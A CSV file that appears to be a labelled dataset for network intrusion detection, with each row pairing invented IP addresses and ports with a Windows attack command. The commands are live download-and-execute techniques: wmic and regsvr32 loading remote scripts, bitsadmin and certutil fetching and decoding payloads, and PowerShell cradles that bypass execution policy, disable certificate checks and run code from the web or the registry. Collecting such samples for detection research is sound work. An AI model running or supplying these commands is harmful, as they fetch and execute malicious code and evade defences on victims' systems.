field,src,dst,p_src,p_dst,proto,attack,length [packet],length [bit]
ID,100.163.44.160,203.139.113.8,62112,80,6,"wmic.exe os get ved5hit39, 25hit8, numberofusers /format:""https://storage.googleapis.com/ultramaker/09/v.txt""
",55,880
ID,103.110.204.140,163.62.129.254,8889,63745,6,"wmic.exe os get QMUTSQPK, JUXKBVOK, LNFTZKMH, freephyscialmemory /format:""https://storage.googleapis.com/ultramaker/08/vv.txt""
",64,1016
ID,107.14.191.181,203.139.123.144,443,51746,6,"bitsadmin.exe /transfer msd5 /priority foreground https://storage.googleapis.com/ultramaker/x/ 09/falcvonxrenwb.jpg.zip.log?
",63,1000
ID,109.196.225.86,203.139.121.234,52816,30303,6,"certutil.exe -decode %PUBLIC%\Libraries\temporary\falxconxrenwb.jpg.z
",35,560
ID,104.236.219.104,163.62.107.170,443,36794,6,"regsvr32.exe /s falxconxrenw64.~
",17,264
ID,109.58.252.70,203.139.121.234,30303,36694,6,"powershell.exe -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://[URL].asp') | iex
",57,912
ID,114.242.110.214,163.62.224.249,21358,443,6,"powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\[Same Random Key]').[Random Value Name])));
",107,1704
ID,116.58.147.90,203.139.121.234,44410,30303,6,"powershell.exe -nop -ep Bypass -noexit -c [System.Net.ServicePointManager]: ServerCertificateValidationCallback = { $true }; iex ((New-Object System.Net.WebClient).DownloadString('https://somerandomevildomain.xx /somerandomflie'))
",116,1848
ID,114.242.111.69,203.139.126.248,41900,443,6,"Regsvr.exe /s /u /i:http://xxx.somerandomevildomain.xx/evilpath.xml scrobj.dl
",39,624
ID,117.234.88.39,163.62.71.17,443,61585,6,"powershell.exe ""if(!([string](Get-WMIobject -Namespace root\Subscription -Class __FilterToConsumerBinding )).contains('SCM Event Filter')) {IEX(New-Object Net.WebClient).DownloadString('[URL]')}""
",98,1568
